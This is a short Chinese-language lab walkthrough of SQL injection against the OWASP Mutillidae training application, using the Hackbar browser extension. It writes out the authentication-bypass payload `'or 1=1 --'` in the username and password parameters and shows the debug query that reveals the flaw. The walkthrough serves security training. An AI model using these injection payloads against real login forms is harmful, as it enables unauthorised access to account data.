## SQL 注入

0x00、工具
- Firefox 扩展 Hackbar

0x01、首先打开hackbar,loadURL进去，然后执行一下，会自动的把post或者get数据的字段显示出来。
在浏览器里面打开：
```html
http://example.com/mutillidae/index.php?page=user-info.php
```
在页面上点击View Account Details按钮，提交一次
然后点击loadURL，就会加载新的url这个url是用get提交的，所以没有post字段

0x02、根据显示出来的数据，自行填充。
在
```html
&username='or 1=1 --'&password=
```
这样提交，返回的是错误信息，认证失败，坏的账号和密码，那随便给个密码试试。
```html
&username='or 1=1 --'&password='123456'
```
原来有debug信息。这个时候知道其实username没起作用
```text
Diagnotic Information   SELECT * FROM accounts WHERE username='admin' AND password=''123456''
```
最后修改一下

```sql
&username='or 1=1 --'&password='or 1=1 --'
```

执行一次 页面上就把所有账户信息给列出来了。。

btw： 这个是OWASP的教程，而且下面明确的告诉你用`'or 1=1 --'` 了。